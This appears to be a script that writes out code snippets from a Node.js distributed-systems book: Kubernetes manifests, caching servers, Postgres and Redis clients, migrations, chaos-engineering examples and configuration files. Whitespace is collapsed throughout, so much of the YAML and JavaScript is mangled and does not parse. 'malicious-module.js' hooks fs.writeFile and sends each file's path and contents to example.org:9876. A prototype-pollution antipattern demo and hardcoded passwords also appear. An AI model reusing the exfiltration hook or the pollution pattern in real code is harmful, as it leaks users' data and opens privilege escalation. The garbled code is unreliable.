code='''#### note the four space indent spec:containers:- name: recipe-api image: recipe-api:v1  ports:- containerPort: 1337  livenessProbe: httpGet:path: /recipes/42 port: 1337initialDelaySeconds: 3periodSeconds: 10''' 
create_folders_file(path,code)

path='recipe-api/recipe-api-network.yml'
code='''apiVersion: v1 kind: Service metadata:name: recipe-api-service  spec:type: NodePort selector:app: recipe-api ports:- protocol: TCP port: 80targetPort: 1337The service is named recipe-api-service.''' 
create_folders_file(path,code)

path='web-api/web-api-deployment.yml'
code='''apiVersion: apps/v1 kind: Deployment metadata:name: web-api labels:app: web-apispec:replicas: 3  selector:matchLabels: app: web-apitemplate: metadata:labels:app: web-api''' 
create_folders_file(path,code)

path='web-api/web-api-deployment.yml'
code='''#### note the four space indent spec:containers:value: "recipe-api-service"''' 
create_folders_file(path,code)

path='web-api/web-api-network.yml'
code='''apiVersion: v1 kind: Service metadata:name: web-api-service spec:type: NodePort selector:app: web-api ports:- port: 1337''' 
create_folders_file(path,code)


path='web-api/web-api-network.yml'
code='''---apiVersion: networking.k8s.io/v1beta1 kind: Ingressmetadata:name: web-api-ingress annotations: nginx.ingress.kubernetes.io/rewrite-target: /$1spec:rules: - host: example.org http:paths:- path: / backend:serviceName: web-api-service servicePort: 1337''' 
create_folders_file(path,code)

path='/tmp/signals.js'
code='''#!/usr/bin/env nodeconsole.log(`Process ID: ${process.pid}`); process.on('SIGHUP', () => console.log('Received: SIGHUP')); process.on('SIGINT', () => console.log('Received: SIGINT')); setTimeout(() => {}, 5 * 60 * 1000); // keep process alive''' 
create_folders_file(path,code)


path='caching/server.js'
code='''#!/usr/bin/env node// npm install fastify@3.2 lru-cache@6.0 node-fetch@2.6 const fetch = require('node-fetch');const server = require('fastify')();const lru = new (require('lru-cache'))({  max: 4096,length: (payload, key) => payload.length + key.length, maxAge: 10 * 60 * 1_000});const PORT = process.env.PORT || 3000;server.get('/account/:account', async (req, reply) => { return getAccount(req.params.account);});server.listen(PORT, () => console.log(`http://localhost:${PORT}`));async function getAccount(account) { const cached = lru.get(account); if (cached) { console.log('cache hit'); return JSON.parse(cached); } console.log('cache miss');const result = await fetch(`https://api.github.com/users/${account}`); const body = await result.text();lru.set(account, body);  return JSON.parse(body);}''' 
create_folders_file(path,code)

path='caching/server-ext.js'
code='''#!/usr/bin/env node// npm install fastify@3.2 memjs@1.2 node-fetch@2.6 const fetch = require('node-fetch');const server = require('fastify')(); const memcache = require('memjs').Client.create('localhost:11211');  const PORT = process.env.PORT || 3000;server.get('/account/:account', async (req, reply) => { return getAccount(req.params.account);});server.listen(PORT, () => console.log(`http://localhost:${PORT}`));async function getAccount(account) {const { value: cached } = await memcache.get(account); if (cached) { console.log('cache hit'); return JSON.parse(cached); } console.log('cache miss');const result = await fetch(`https://api.github.com/users/${account}`); const body = await result.text();await memcache.set(account, body, {});  return JSON.parse(body);}''' 
create_folders_file(path,code)

path='dbconn/reconnect.js'
code='''#!/usr/bin/env node// npm install fastify@3.2 pg@8.2const DatabaseReconnection = require('./db.js');  const db = new DatabaseReconnection({host: 'localhost', port: 5432, user: 'user', password: 'hunter2', database: 'dbconn', retry: 1_000});db.connect(); db.on('error', (err) => console.error('db error', err.message)); db.on('reconnect', () => console.log('reconnecting...')); db.on('connect', () => console.log('connected.')); db.on('disconnect', () => console.log('disconnected.'));''' 
create_folders_file(path,code)

path='dbconn/reconnect.js'
code='''const server = require('fastify')(); server.get('/foo/:foo_id', async (req, reply) => {try {var res = await db.query( 'SELECT NOW() AS time, $1 AS echo', [req.params.foo_id]);} catch (e) { reply.statusCode = 503; return e;}return res.rows[0];});server.get('/health', async(req, reply) => { if (!db.connected) { throw new Error('no db connection'); } return 'OK';});server.listen(3000, () => console.log(`http://localhost:3000`));''' 
create_folders_file(path,code)

path='dbconn/db.js'
code='''const { Client } = require('pg');const { EventEmitter } = require('events');class DatabaseReconnection extends EventEmitter { #client = null;	#conn = null;#kill = false;	connected = false;constructor(conn) { super(); this.#conn = conn;}''' 
create_folders_file(path,code)

path='dbconn/db.js'
code='''connect() {if (this.#client) this.#client.end();  if (this.kill) return;const client = new Client(this.#conn); client.on('error', (err) => this.emit('error', err)); client.once('end', () => { if (this.connected) this.emit('disconnect'); this.connected = false;if (this.kill) return;setTimeout(() => this.connect(), this.#conn.retry || 1_000);});client.connect((err) => { this.connected = !err;if (!err) this.emit('connect');});this.#client = client; this.emit('reconnect');}''' 
create_folders_file(path,code)

path='dbconn/db.js'
code='''async query(q, p) {if (this.#kill || !this.connected) throw new Error('disconnected'); return this.#client.query(q, p);}disconnect() { this.#kill = true; this.#client.end();}}module.exports = DatabaseReconnection;''' 
create_folders_file(path,code)

path='dbconn/pool.js'
code='''#!/usr/bin/env node// npm install fastify@3.2 pg@8.2 const { Pool } = require('pg');const db = new Pool({host: 'localhost', port: 5432, user: 'user', password: 'hunter2',database: 'dbconn', max: process.env.MAX_CONN || 10});db.connect();const server = require('fastify')(); server.get('/', async () => (await db.query("SELECT NOW() AS time, 'world' AS hello")).rows[0]); server.listen(3000, () => console.log(`http://localhost:3000`));''' 
create_folders_file(path,code)

path='dbconn/serial.js'
code='''#!/usr/bin/env node// npm install pg@8.2const { Client } = require('pg'); const db = new Client({host: 'localhost', port: 5432, user: 'user', password: 'hunter2', database: 'dbconn'});db.connect();(async () => {const start = Date.now(); await Promise.all([ db.query("SELECT pg_sleep(2);"), db.query("SELECT pg_sleep(2);"),]);console.log(`took ${(Date.now() - start) / 1000} seconds`); db.end();})();''' 
create_folders_file(path,code)

path='migrations/knexfile.js'
code='''module.exports = { development: {client: 'pg', connection: {host: 'localhost', port: 5432, user: 'user', password: 'hunter2', database: 'dbconn'}}};''' 
create_folders_file(path,code)

path='migrations/migrations/20200525141008_create_users.js'
code='''module.exports.up = async (knex) => {await knex.schema.createTable('users', (table) => { table.increments('id').unsigned().primary(); table.string('username', 24).unique().notNullable();});await knex('users').insert([{username: 'tlhunter'},{username: 'steve'},{username: 'bob'},]);};module.exports.down = (knex) => knex.schema.dropTable('users');''' 
create_folders_file(path,code)

path='migrations/migrations/20200525172807_create_groups.js'
code='''module.exports.up = async (knex) => { await knex.raw(`CREATE TABLE groups (id SERIAL PRIMARY KEY,name VARCHAR(24) UNIQUE NOT NULL)`);await knex.raw(`INSERT INTO groups (id, name) VALUES (1, 'Basic'), (2, 'Mods'), (3, 'Admins')`);await knex.raw(`ALTER TABLE users ADD COLUMNgroup_id INTEGER NOT NULL REFERENCES groups (id) DEFAULT 1`);};module.exports.down = async (knex) => {await knex.raw(`ALTER TABLE users DROP COLUMN group_id`); await knex.raw(`DROP TABLE groups`);};''' 
create_folders_file(path,code)


path='Example 8-14. Random crash chaos'
code='''if (process.env.NODE_ENV === 'staging') {const LIFESPAN = Math.random() * 100_000_000; // 0 - 30 hours setTimeout(() => {console.error('chaos exit'); process.exit(99);}, LIFESPAN);}''' 
create_folders_file(path,code)


path='Example 8-15. Random event loop pauses'
code='''const TIMER = 100_000; function slow() {fibonacci(1_000_000n);setTimeout(slow, Math.random() * TIMER);}setTimeout(slow, Math.random() * TIMER);''' 
create_folders_file(path,code)


path='Example 8-16. Random async failures'
code='''const THRESHOLD = 10_000;async function chaosQuery(query) {if (math.random() * THRESHOLD <= 1) { throw new Error('chaos query');}return db.query(query);}const result = await chaosQuery('SELECT foo FROM bar LIMIT 1'); return result.rows[0];''' 
create_folders_file(path,code)


path='link-shortener.js'
code='''const fs = require('fs'); fs.writeFileSync('/tmp/count.txt', '0'); // only run once function setUrl(url) {const id = Number(fs.readFileSync('/tmp/count.txt').toString()) + 1; fs.writeFileSync('/tmp/count.txt', String(id)); fs.writeFileSync(`/tmp/${id}.txt`, url);return `sho.rt/${id}`;}function getUrl(code) {return fs.readFileSync(`/tmp/${code}.txt`).toString();}''' 
create_folders_file(path,code)

path='Example 9-2. redis/basic.js'
code='''#!/usr/bin/env node// npm install ioredis@4.17const Redis = require('ioredis');const redis = new Redis('localhost:6379');(async () => {await redis.set('foo', 'bar');const result = await redis.get('foo'); console.log('result:', result); redis.quit();})();''' 
create_folders_file(path,code)


path='redis/transaction.js'
code='''#!/usr/bin/env node// npm install ioredis@4.17const Redis = require('ioredis');const redis = new Redis('localhost:6379');(async () => {const [res_srem, res_hdel] = await redis.multi() .srem("employees", "42") // Remove from Set.hdel("employee-42", "company-id") // Delete from Hash.exec(); console.log('srem?', !!res_srem[1], 'hdel?', !!res_hdel[1]); redis.quit();})();''' 
create_folders_file(path,code)

path='redis/add-user.lua'
code='''local LOBBY = KEYS[1] -- Set local GAME = KEYS[2] -- Hash local USER_ID = ARGV[1] -- Stringredis.call('SADD', LOBBY, USER_ID)if redis.call('SCARD', LOBBY) == 4 thenlocal members = table.concat(redis.call('SMEMBERS', LOBBY), ",") redis.call('DEL', LOBBY) -- empty lobbylocal game_id = redis.sha1hex(members) redis.call('HSET', GAME, game_id, members) return {game_id, members}endreturn nil''' 
create_folders_file(path,code)

path='redis/script.js'
code='''#!/usr/bin/env node// npm install ioredis@4.17const redis = new (require('ioredis'))('localhost:6379'); redis.defineCommand("adduser", {numberOfKeys: 2,lua: require('fs').readFileSync(  dirname + '/add-user.lua')});const LOBBY = 'lobby', GAME = 'game'; (async () => {console.log(await redis.adduser(LOBBY, GAME, 'alice')); // null console.log(await redis.adduser(LOBBY, GAME, 'bob')); // null console.log(await redis.adduser(LOBBY, GAME, 'cindy')); // null const [gid, players] = await redis.adduser(LOBBY, GAME, 'tlhunter'); console.log('GAME ID', gid, 'PLAYERS', players.split(',')); redis.quit();})();''' 
create_folders_file(path,code)


path='prototype-pollution.js'
code='''// WARNING: ANTIPATTERN!function shallowClone(obj) { const clone = {};for (let key of Object.keys(obj)) { clone[key] = obj[key];}return clone;}const request = '{"user":"tlhunter","  proto  ":{"isAdmin":true}}'; const obj = JSON.parse(request);if ('isAdmin' in obj) throw new Error('cannot specify isAdmin'); const user = shallowClone(obj);console.log(user.isAdmin); // true''' 
create_folders_file(path,code)


path='malicious-module.js'
code='''const fs = require('fs'); const net = require('net');const CONN = { host: 'example.org', port: 9876 }; const client = net.createConnection(CONN, () => {}); const _writeFile = fs.writeFile.bind(fs); fs.writeFile = function() {client.write(`${String(arguments[0])}:::${String(arguments[1])}`); return _writeFile(...arguments);};''' 
create_folders_file(path,code)

path='dev.env'
code='''export REDIS=redis://admin:hunter2@192.168.2.1''' 
create_folders_file(path,code)

path='configuration/config/default.js'
code='''module.exports = {REDIS: process.env.REDIS, WIDGETS_PER_BATCH: 2,MAX_WIDGET_PAYLOAD: Number(process.env.PAYLOAD) || 1024 * 1024};''' 
create_folders_file(path,code)

path='configuration/config/development.js'
code='''module.exports = { ENV: 'development',REDIS: process.env.REDIS || 'redis://localhost:6379', MAX_WIDGET_PAYLOAD: Infinity};''' 
create_folders_file(path,code)

path='configuration/config/index.js'
code='''const { join } = require('path'); const ENV = process.env.NODE_ENV;try {var env_config = require(join(  dirname, `${ENV}.js`));} catch (e) {console.error(`Invalid environment: "${ENV}"!`); console.error(`Usage: NODE_ENV=<ENV> node app.js`); process.exit(1);}const def_config = require(join(  dirname, 'default.js'));module.exports = Object.assign({}, def_config, env_config); ''' 
create_folders_file(path,code)
